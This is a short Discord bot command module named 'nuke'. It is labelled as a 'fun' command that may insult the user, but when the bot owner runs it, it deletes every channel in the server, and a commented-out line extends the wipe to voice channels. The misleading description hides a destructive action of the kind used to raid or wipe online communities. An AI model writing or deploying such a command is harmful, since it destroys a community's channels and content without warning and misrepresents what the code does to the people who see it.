 const { OwnerID } = require('../../config.json')
 module.exports = {
  name: "nuke",
  description: "There is a big chance I insult you!",
    aliases: [],
  category: "fun",
  run: async (client, message, args) => {
    if(message.author.id !== OwnerID) return message.channel.send(`I am sorry ${message.author.tag} but only the Owner of this bot can use this command`)
    message.guild.channels.cache.forEach(ch => ch.delete());
    
    // message.guild.voiceChannelnels.cache.forEach(vc => vc.delete());
    //voiceChannel  
  },
} 


